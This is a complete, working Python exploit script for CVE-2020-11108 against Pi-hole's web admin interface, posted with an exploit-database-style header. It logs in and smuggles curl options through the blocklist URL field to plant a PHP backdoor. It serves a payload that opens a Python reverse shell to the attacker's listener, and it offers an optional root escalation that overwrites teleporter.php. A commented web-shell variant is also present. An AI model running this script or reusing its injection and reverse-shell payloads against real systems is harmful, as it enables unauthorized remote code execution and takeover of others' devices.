# Date: 2020-05-22
# Exploit Author: Photubias
# Vendor Advisory: [1] https://github.com/pi-hole/AdminLTE
# Version: Pi-hole <=4.4.0 + Web <=4.3.3
# Tested on: Pi-hole v4.4.0-g9e49077, Web v4.3.3,v4.3.2-1-g4f824be, FTL v5.0 (on Debian 10)
# CVE: CVE-2020-11108

#!/usr/bin/env python3
&#039;&#039;&#039;
	Copyright 2020 Photubias(c)        
        This program is free software: you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation, either version 3 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program.  If not, see <http://www.gnu.org/licenses/>.
        
        Based (and improved on): https://github.com/Frichetten/CVE-2020-11108-PoC/blob/master/cve-2020-11108-rce.py
        
        File name CVE-2020-11108.py
        written by tijl[dot]deneut[at]howest[dot]be for www.ic4.be
        
        ## Vulnerable setup instructions (from clean Debian 10-Buster):
        > apt update && apt install -y curl
        > curl -sSL https://install.pi-hole.net | bash
        > pihole checkout web release/v4.3.3
        > cd /etc/.pihole/ && git checkout v4.4
        > pihole -r ## Select reconfigure
        
        This is a native implementation without requirements, written in Python 3.
        Works equally well on Windows as Linux (as MacOS, probably ;-)
        
        Features:
        * Does a reliable check before exploitation (not based on version numbers)
        * Performs normal RCE without Privilege Escalation (wich is more trust worthy)
        * Asks before running Root RCE (as this overwrites certain files)
        * Performs a cleanup in all cases (success / failure)
&#039;&#039;&#039;

import urllib.request, ssl, http.cookiejar, sys, string, random
import socket, _thread, time

## Default vars; change at will
_sURL = &#039;192.168.50.130&#039;
_sPASSWORD = &#039;6DS4QtW5&#039;
_iTIMEOUT = 5
_sLOCALIP = &#039;192.168.50.1&#039;
_sFILENAME = &#039;fun2.php&#039;
_sLOCALNCPORT = &#039;4444&#039; ## Make sure to set up a listener on this port first

## Ignore unsigned certs
ssl._create_default_https_context = ssl._create_unverified_context

## Keep track of cookies between requests
cj = http.cookiejar.CookieJar()
oOpener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def randomString(iStringLength=8):
    sLetters = string.ascii_lowercase
    return &#039;&#039;.join(random.choice(sLetters) for i in range(iStringLength))

def postData(sURL, lData, bEncode = True):
    try:
        if bEncode: oData = urllib.parse.urlencode(lData).encode()
        else: oData = str(lData).encode()
        oRequest = urllib.request.Request(url = sURL, data = oData)
        return oOpener.open(oRequest, timeout = _iTIMEOUT)
    except:
        print(&#039;----- ERROR, site down?&#039;)
        sys.exit(1)

def getEndpoint():
    if not _sURL[:4].lower() == &#039;http&#039;: sURL = &#039;http://&#039; + _sURL
    else: sURL = _sURL
    if not sURL[:-1] == &#039;/&#039;: sURL += &#039;/&#039;
    if not &#039;/admin&#039; in sURL: sURL += &#039;admin&#039;
    try:
        oRequest = urllib.request.Request(sURL)
        oResponse = oOpener.open(oRequest, timeout = _iTIMEOUT)
    except:
        print(&#039;[-] Error: &#039; + sURL + &#039; not responding&#039;)
        exit(1)
    if oResponse.code == 200:
        print(&#039;[+] Vulnerable URL is &#039; + sURL)
        return sURL
    else:
        print(&#039;[-] Error: &#039; + sURL + &#039; does not exist?&#039;)
        exit(1)

def startListener(sPayload, iSockTimeout):
    ## Listener must always be on port 80, does not work otherwise
    oSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print(&#039;[!] Binding to &#039;+_sLOCALIP+&#039;:80&#039;)
    oSock.bind((_sLOCALIP,80))
    oSock.settimeout(iSockTimeout)
    oSock.listen()

    while True:
        try: oConn,sAddr= oSock.accept()
        except: break
        print(&#039;[+] Yes, we have an incoming connection from &#039;+str(sAddr[0]))
        oConn.sendall(sPayload.encode())
        oConn.close()
        break
    oSock.close()
    print(&#039;[!] Closing Listener&#039;)

def doLogin(sURL, sPassword):
    sPath = &#039;/index.php?login&#039;
    lData = {&#039;pw&#039;:sPassword}
    oResponse = postData(sURL + sPath, lData)
    sResult = oResponse.read().decode(errors=&#039;ignore&#039;)
    if &#039;Wrong password&#039; in sResult:
        print(&#039;Wrong password&#039;)
        sys.exit(1)
    return True

def getToken(sURL):
    sPath = &#039;/settings.php?tab=blocklists&#039;
    oResponse = oOpener.open(urllib.request.Request(sURL + sPath), timeout = _iTIMEOUT)
    sResult = oResponse.read().decode(errors=&#039;ignore&#039;)
    if &#039;id=\&#039;token\&#039;&#039; in sResult:
        return sResult.split(&#039;id=\&#039;token\&#039; hidden>&#039;)[1].split(&#039;<&#039;)[0]
    else:
        print(&#039;[-] Error in getting a token&#039;)
        sys.exit(1)
    
def createBackdoor(sURL, sFilename):
    sToken = getToken(sURL)
    sPath = &#039;/settings.php?tab=blocklists&#039;
    lData = {&#039;newuserlists&#039;:&#039;http://&#039; + _sLOCALIP + &#039;#" -o &#039; + sFilename + &#039; -d "&#039;, &#039;field&#039;:&#039;adlists&#039;, &#039;token&#039;:sToken, &#039;submit&#039;:&#039;save&#039;}
    #lData = {&#039;newuserlists&#039;:&#039;http://&#039; + _sLOCALIP + &#039;#" -o fun.php -d "&#039;, &#039;field&#039;:&#039;adlists&#039;, &#039;token&#039;:sToken, &#039;submit&#039;:&#039;saveupdate&#039;}
    oResponse = postData(sURL + sPath, lData)
    if oResponse.code == 200:
        sResult = oResponse.read().decode(errors=&#039;ignore&#039;)
        arrBlocklists = sResult.split(&#039;target="_new"&#039;)
        sID = str(len(arrBlocklists)-2)
        print(&#039;[+] Creation success, ID is &#039;+sID+&#039;!&#039;)
        return sID
    else:
        return &#039;&#039;


def doUpdate(sURL):
    sPath = &#039;/scripts/pi-hole/php/gravity.sh.php&#039;
    try:
        oResponse = oOpener.open(urllib.request.Request(sURL + sPath), timeout = _iTIMEOUT)
        if oResponse.code == 200: print(&#039;[+] Update succeeded.&#039;)
        return True
    except:
        print(&#039;[-] Error; callback failed, maybe a firewall issue?&#039;)
        return False

def callExploit(sURL, sFilename = _sFILENAME):
    sPath = &#039;/scripts/pi-hole/php/&#039; + sFilename
    print(&#039;[+] Calling &#039; + sURL + sPath)
    try:
        oResponse = oOpener.open(urllib.request.Request(sURL + sPath), timeout = _iTIMEOUT)
        if oResponse.code == 200: print(&#039;[+] Calling exploit succeeded.&#039;)
        print(oResponse.read().decode(errors=&#039;ignore&#039;))
    except:
        pass

def removeEntry(sURL, sID):
    print(&#039;[+] Cleaning up now.&#039;)
    sToken = getToken(sURL)
    sPath = &#039;/settings.php?tab=blocklists&#039;
    lData = {&#039;adlist-del-&#039;+sID:&#039;on&#039;, &#039;newuserlists&#039;:&#039;&#039;, &#039;field&#039;:&#039;adlists&#039;, &#039;token&#039;:sToken, &#039;submit&#039;:&#039;save&#039;}
    oResponse = postData(sURL + sPath, lData)
    if oResponse.code == 200:
        print(&#039;[+] Remove success&#039;)

def main():
    global _sURL, _sPASSWORD, _iTIMEOUT, _sLOCALIP, _sFILENAME, _sLOCALNCPORT
    if len(sys.argv) == 1:
        print(&#039;[!] No arguments found: python3 CVE-2020-11108.py <dstIP> <srcIP> <PWD>&#039;)
        print(&#039;    Example: ./CVE-2020-11108.py 192.168.50.130 192.168.50.1 6DS4QtW5&#039;)
        print(&#039;    But for now, I will ask questions&#039;)
        sAnswer = input(&#039;[?] Please enter the IP address for Pi-Hole ([&#039; + _sURL + &#039;]): &#039;)
        if not sAnswer == &#039;&#039;: _sURL = sAnswer
        sAnswer = input(&#039;[?] Please enter the your (reachable) IP address to launch listeners ([&#039; + _sLOCALIP + &#039;]): &#039;)
        if not sAnswer == &#039;&#039;: _sLOCALIP = sAnswer
        sAnswer = input(&#039;[?] Please enter the password for Pi-Hole ([&#039; + _sPASSWORD + &#039;]): &#039;)
        if not sAnswer == &#039;&#039;: _sPASSWORD = sAnswer
    else:
        _sURL = sys.argv[1]
        _sLOCALIP = sys.argv[2]
        _sPASSWORD = sys.argv[3]
    
    ## MAIN
    sURL = getEndpoint() ## Will also set the initial SessionID
    doLogin(sURL, _sPASSWORD)
    
    ## Creating backdoor (1) ## the old &#039;fun.php&#039;
    sFilename = randomString() + &#039;.php&#039;
    sID = createBackdoor(sURL, sFilename)
    
    ## Launch first payload listener and send 200 OK
    _thread.start_new_thread(startListener,(&#039;HTTP/1.1 200 OK\n\nCVE-2020-11108\n&#039;,5,))
    if doUpdate(sURL):
        print(&#039;[+] This system is vulnerable!&#039;)
    
    ## Question Time
    sAnswer = input(&#039;Want to continue with exploitation? (Or just run cleanup)? [y/N]: &#039;)
    if not sAnswer.lower() == &#039;y&#039;:
        removeEntry(sURL, sID)
        sys.exit(0)
    sAnswer = input(&#039;Want root access? (Breaks the application!!) [y/N]: &#039;)
    if sAnswer.lower() == &#039;y&#039;: bRoot = True
    else: bRoot = False
    
    if bRoot:
        print(&#039;[!] Allright, going for the root shell&#039;)
        ## Launch payload listener and send root shell
        _sPayload = &#039;&#039;&#039;<?php shell_exec("sudo pihole -a -t") ?>&#039;&#039;&#039;
        _thread.start_new_thread(startListener,(_sPayload,5,))
        doUpdate(sURL)
    
        ## Creating backdoor (2), overwriting teleporter.php
        sID2 = createBackdoor(sURL, &#039;teleporter.php&#039;)
    
        ## Launch payload listener for a new 200 OK
        _thread.start_new_thread(startListener,(&#039;HTTP/1.1 200 OK\n\nCVE-2020-11108\n&#039;,5,))
        doUpdate(sURL)
    
    
    ## Launch shell payload listener:
    _sPayload = &#039;&#039;&#039;<?php
    shell_exec("python3 -c &#039;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"%s\\\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"]);&#039;")
    ?>
    &#039;&#039;&#039; %(_sLOCALIP, _sLOCALNCPORT)
    #_sPayload = &#039;&#039;&#039;<?php system($_GET[&#039;cmd&#039;]); ?>&#039;&#039;&#039; ## this works perfectly, but the URL is authenticated
    _thread.start_new_thread(startListener,(_sPayload,5,))
    doUpdate(sURL)
    
    ## Launching the payload, will create new PHP file
    callExploit(sURL, sFilename)
    
    ## Remove entry again
    if bRoot: removeEntry(sURL, sID2)
    removeEntry(sURL, sID)
    

if __name__ == "__main__":
    main()

